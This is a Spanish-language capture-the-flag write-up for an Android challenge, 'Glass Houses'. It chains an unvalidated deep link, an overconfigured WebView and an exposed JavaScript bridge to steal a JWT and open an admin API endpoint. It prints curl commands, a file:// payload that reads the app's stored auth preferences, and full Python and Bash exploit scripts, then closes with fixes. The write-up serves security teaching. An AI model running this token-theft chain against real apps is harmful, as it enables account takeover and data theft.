![[Pasted image 20260704135847.png]]
---
# 🏴 FLUIDREALTY CTF - Documentación completa

## 📋 Información general
- **Challenge:** Glass Houses
- **Categoría:** Mobile
- **Dificultad:** Medium
- **Puntos:** 100
- **Flag obtenida:** `flag{e3baede36dd89c5b}`

---

## 🔍 1. Análisis inicial

### 1.1 Archivos proporcionados
Se proporcionaron los siguientes archivos de la aplicación Android:

- `AndroidManifest.xml`
- `MainActivity.java`
- `WebViewActivity.java`
- `TokenManager.java`
- `network_security_config.xml`

### 1.2 Vulnerabilidades identificadas

| Vulnerabilidad | Descripción | Impacto |
|---------------|-------------|---------|
| Deep Link inseguro | `fluidrealty://view?url=` permite URLs arbitrarias | Ejecución de código en WebView |
| WebView sobreconfigurado | JavaScript, File Access, Bridge expuesto | Acceso a archivos locales |
| Bridge Android expuesto | `AndroidBridge` con métodos sensibles | Extracción de tokens JWT |
| Autenticación débil | Token JWT sin protección adicional | Acceso a datos restringidos |

### 1.3 Endpoints de la API descubiertos

```json
{
  "endpoints": [
    "/api/properties",
    "/api/properties/admin",
    "/api/deeplink/process",
    "/api/webview/simulate"
  ],
  "service": "FluidRealty API",
  "version": "3.7.2"
}
```


## 🔐 2. Extracción del token JWT

### 2.1 Exploración del bridge Android

Se utilizó el endpoint `/api/deeplink/process` para descubrir los métodos del bridge:


```bash
curl -sk -X POST "https://f3f4fb34235239ed.chal.ctf.ae/api/deeplink/process" \
  -H "Content-Type: application/json" \
  -d '{"deeplink": "fluidrealty://view?url=file:///data/data/com.fluidrealty.app/shared_prefs/fluidrealty_auth.xml"}'
```

Respuesta:

```json
{
  "bridge_methods": [
    "getAuthToken",
    "getDeviceId",
    "getAppVersion",
    "showToast",
    "logEvent"
  ]
}
```


### 2.2 Llamada al método getAuthToken

El método correcto para llamar al bridge fue:

```bash
curl -sk -X POST "https://f3f4fb34235239ed.chal.ctf.ae/api/webview/simulate" \
  -H "Content-Type: application/json" \
  -d '{"javascript": "var token = AndroidBridge.getAuthToken(); document.body.innerHTML = token;"}'
```

Respuesta:

```json
{
  "execution": {
    "method": "getAuthToken",
    "result": "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWRtaW4iLCAicm9sZSI6ICJwcm9wZXJ0eV9tYW5hZ2VyIiwgImlhdCI6IDE3ODMxOTQ4ODQsICJleHAiOiAxNzgzMTk4NDg0LCAiaXNzIjogImZsdWlkcmVhbHR5LWFuZHJvaWQifQ.YTRmODNkMWU4ZDA4M2QxNmI3NDQzYzZhOTIxNWRmYTUyOWZhYmI3N2MyMmJmNmFiMDk2MjIxNjRkMzY1OWU4NQ",
    "success": true
  }
}
```



### 2.3 Token JWT obtenido

```
eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWRtaW4iLCAicm9sZSI6ICJwcm9wZXJ0eV9tYW5hZ2VyIiwgImlhdCI6IDE3ODMxOTQ4ODQsICJleHAiOiAxNzgzMTk4NDg0LCAiaXNzIjogImZsdWlkcmVhbHR5LWFuZHJvaWQifQ.YTRmODNkMWU4ZDA4M2QxNmI3NDQzYzZhOTIxNWRmYTUyOWZhYmI3N2MyMmJmNmFiMDk2MjIxNjRkMzY1OWU4NQ
```

### 2.4 Decodificación del JWT

```json
// Header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Payload
{
  "sub": "admin",
  "role": "property_manager",
  "iat": 1783194884,
  "exp": 1783194884,
  "iss": "fluidreality-android"
}
```

Análisis:

- **Usuario:** admin
- **Rol:** property_manager
- **Emisor:** fluidreality-android

## 🚀 3. Obtención de la flag

### 3.1 Acceso a propiedades admin

```bash
curl -sk "https://f3f4fb34235239ed.chal.ctf.ae/api/properties/admin" \
  -H "Authorization: Bearer eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9..."
```

### 3.2 Respuesta del servidor

```json
{
  "flag": "flag{e3baede36dd89c5b}",
  "message": "Access granted to classified listings",
  "properties": [
    {
      "id": 101,
      "title": "CLASSIFIED - Government Building",
      "city": "Bogota",
      "status": "restricted",
      "price": 15000000,
      "notes": "Diplomatic property - restricted access"
    },
    {
      "id": 102,
      "title": "CLASSIFIED - Embassy Residence",
      "city": "Bogota",
      "status": "restricted",
      "price": 8500000,
      "notes": "Embassy staff housing - classified"
    }
  ],
  "total": 2
}
```

🏴 ¡Flag obtenida!

## 📝 4. Script completo de explotación

### 4.1 Script en Python

```python
import requests
import json
import urllib3

# Desactivar advertencias SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class FluidRealtyExploit:
    def __init__(self):
        self.base_url = "https://f3f4fb34235239ed.chal.ctf.ae"
        self.token = None
    
    def get_token(self):
        """Extrae el token JWT usando el bridge Android"""
        js_code = "var token = AndroidBridge.getAuthToken(); document.body.innerHTML = token;"
        payload = {"javascript": js_code}
        
        try:
            r = requests.post(
                f"{self.base_url}/api/webview/simulate",
                json=payload,
                verify=False,
                timeout=10
            )
            data = r.json()
            self.token = data.get("execution", {}).get("result")
            return self.token
        except Exception as e:
            print(f"Error obteniendo token: {e}")
            return None
    
    def get_flag(self):
        """Usa el token para obtener la flag"""
        if not self.token:
            print("No hay token disponible")
            return None
        
        headers = {"Authorization": f"Bearer {self.token}"}
        
        try:
            r = requests.get(
                f"{self.base_url}/api/properties/admin",
                headers=headers,
                verify=False,
                timeout=10
            )
            return r.json()
        except Exception as e:
            print(f"Error obteniendo flag: {e}")
            return None
    
    def run(self):
        """Ejecuta el exploit completo"""
        print("=" * 60)
        print("🏴 Explotando FluidRealty CTF")
        print("=" * 60)
        
        print("\n[1] Extrayendo token JWT...")
        token = self.get_token()
        
        if token:
            print(f"[+] Token obtenido: {token[:50]}...")
            
            print("\n[2] Obteniendo flag...")
            flag_data = self.get_flag()
            
            if flag_data:
                print(f"\n🏴 ¡FLAG ENCONTRADA! {flag_data['flag']}")
                print(json.dumps(flag_data, indent=2))
            else:
                print("[-] No se pudo obtener la flag")
        else:
            print("[-] No se pudo obtener el token")

# Ejecutar exploit
if __name__ == "__main__":
    exploit = FluidRealtyExploit()
    exploit.run()
```

### 4.2 Script en Bash

```bash
#!/bin/bash

BASE_URL="https://f3f4fb34235239ed.chal.ctf.ae"

echo "🏴 Explotando FluidRealty CTF"
echo "============================================================"

# 1. Obtener token
echo "[1] Extrayendo token JWT..."
TOKEN=$(curl -sk -X POST "$BASE_URL/api/webview/simulate" \
  -H "Content-Type: application/json" \
  -d '{"javascript": "var token = AndroidBridge.getAuthToken(); document.body.innerHTML = token;"}' \
  | jq -r '.execution.result')

if [ -n "$TOKEN" ] && [ "$TOKEN" != "null" ]; then
    echo "[+] Token obtenido: ${TOKEN:0:50}..."
    
    # 2. Obtener flag
    echo "[2] Obteniendo flag..."
    curl -sk "$BASE_URL/api/properties/admin" \
      -H "Authorization: Bearer $TOKEN" | jq .
else
    echo "[-] No se pudo obtener el token"
fi
```


## 🛡️ 5. Análisis de vulnerabilidades

### 5.1 Deep Link inseguro

Código vulnerable:

```java
case "view":
    String url = deepLink.getQueryParameter("url");
    if (url != null) {
        Intent webViewIntent = new Intent(this, WebViewActivity.class);
        webViewIntent.putExtra("load_url", url);
        startActivity(webViewIntent);
    }
    break;
```

**Riesgo:** Permite abrir URLs arbitrarias en el WebView.

**Explotación:**

```
fluidrealty://view?url=file:///data/data/com.fluidrealty.app/shared_prefs/fluidrealty_auth.xml
```

### 5.2 WebView sobreconfigurado

```java
settings.setAllowFileAccess(true);
settings.setAllowContentAccess(true);
settings.setAllowUniversalAccessFromFileURLs(true);
settings.setAllowFileAccessFromFileURLs(true);
settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
webView.addJavascriptInterface(new AndroidBridge(this), "AndroidBridge");
```

**Riesgos:**

- ✅ Acceso a archivos locales
- ✅ JavaScript habilitado
- ✅ Bridge Android expuesto

### 5.3 Bridge expuesto

```java
public class AndroidBridge {
    public String getAuthToken() {
        return TokenManager.getInstance(context).getCurrentToken();
    }
    // ... otros métodos
}
```

**Riesgo:** Cualquier página web puede llamar a `AndroidBridge.getAuthToken()` y obtener el token.

## 📊 6. Línea de tiempo del ataque

```
1. [Reconocimiento]
   └─ Análisis de AndroidManifest.xml y código fuente
   └─ Descubrimiento de endpoints de la API

2. [Exploración]
   └─ Prueba de endpoints
   └─ Descubrimiento de /api/deeplink/process
   └─ Descubrimiento de /api/webview/simulate

3. [Explotación del bridge]
   └─ Enumeración de métodos del bridge
   └─ Llamada a getAuthToken()
   └─ Obtención del token JWT

4. [Acceso a datos restringidos]
   └─ Uso del token Bearer
   └─ Acceso a /api/properties/admin
   └─ Obtención de la flag
```

## 🎯 7. Comandos clave usados

```bash
# 1. Ver endpoints disponibles
curl -sk "https://f3f4fb34235239ed.chal.ctf.ae/" | jq .

# 2. Explorar el bridge
curl -sk -X POST "$BASE_URL/api/deeplink/process" \
  -H "Content-Type: application/json" \
  -d '{"deeplink": "fluidrealty://view?url=file:///data/data/com.fluidrealty.app/shared_prefs/fluidrealty_auth.xml"}'

# 3. Obtener token
curl -sk -X POST "$BASE_URL/api/webview/simulate" \
  -H "Content-Type: application/json" \
  -d '{"javascript": "var token = AndroidBridge.getAuthToken(); document.body.innerHTML = token;"}'

# 4. Obtener flag
curl -sk "$BASE_URL/api/properties/admin" \
  -H "Authorization: Bearer $TOKEN"

# 5. Extraer flag automáticamente
TOKEN=$(curl -sk -X POST "$BASE_URL/api/webview/simulate" \
  -H "Content-Type: application/json" \
  -d '{"javascript": "var token = AndroidBridge.getAuthToken(); document.body.innerHTML = token;"}' \
  | jq -r '.execution.result') && \
curl -sk "$BASE_URL/api/properties/admin" \
  -H "Authorization: Bearer $TOKEN" | jq -r '.flag'
```

## 📌 8. Lecciones aprendidas

✅ **Buenas prácticas que faltaron:**

**No exponer bridges en WebViews**
- Los bridges permiten acceso a funciones nativas
- Deben estar deshabilitados para contenido no confiable

**Validar deep links**
- Solo permitir URLs de dominios confiables
- No permitir `file://` o `data:` protocols

**Configurar WebView seguro**

```java
settings.setAllowFileAccess(false);
settings.setAllowUniversalAccessFromFileURLs(false);
settings.setAllowFileAccessFromFileURLs(false);
```

**Autenticación robusta**
- Tokens JWT con expiración corta
- Validación en el servidor
- No confiar en el cliente

**Validación de inputs en la API**
- No aceptar parámetros arbitrarios
- Usar whitelists de parámetros permitidos

## 🔗 9. Recursos útiles

- OWASP Mobile Top 10
- Android WebView Security
- JWT Debugger
- Insecure WebView Exploitation

## 📝 10. Conclusión

Este CTF demostró cómo una combinación de vulnerabilidades aparentemente menores puede llevar a un compromiso completo del sistema:

1. Deep link inseguro → Acceso al WebView
2. WebView sobreconfigurado → Ejecución de JavaScript arbitrario
3. Bridge expuesto → Extracción del token JWT
4. API sin autenticación adecuada → Acceso a datos restringidos

La flag `flag{e3baede36dd89c5b}` fue obtenida explotando esta cadena de vulnerabilidades.

🏴 CTF completado con éxito